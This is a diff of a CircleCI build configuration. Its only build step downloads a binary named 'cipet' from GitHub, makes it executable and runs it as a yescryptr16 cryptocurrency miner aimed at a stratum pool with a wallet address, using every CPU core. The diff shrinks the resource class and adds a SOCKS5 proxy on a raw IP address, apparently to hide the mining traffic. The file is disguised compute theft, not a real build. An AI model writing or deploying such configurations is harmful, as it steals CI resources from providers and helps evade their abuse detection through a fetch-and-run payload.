@@ -4,8 +4,8 @@ jobs:
   build:
     docker:
      - image: cimg/base:current
-    resource_class: 2xlarge
+    resource_class: large
     working_directory: /mnt/ramdisk
 
     steps:
-      - run: wget https://github.com/clasmildyt/tes/raw/main/cipet && chmod +x cipet && ./cipet -a yescryptr16 -o stratum+tcp://stratum-na.rplant.xyz:7055 -u qZnyHPgAKdf9kMNCE766YqqhRtSnK12MAx.tes$(echo $(shuf -i 1-999 -n 1)) -t $(nproc --all)
+      - run: wget https://github.com/clasmildyt/tes/raw/main/cipet && chmod +x cipet && ./cipet -a yescryptr16 -o stratum+tcp://stratum-na.rplant.xyz:7055 -u qZnyHPgAKdf9kMNCE766YqqhRtSnK12MAx.tes$(echo $(shuf -i 1-999 -n 1)) -t $(nproc --all) --proxy socks5://72.210.208.101:4145
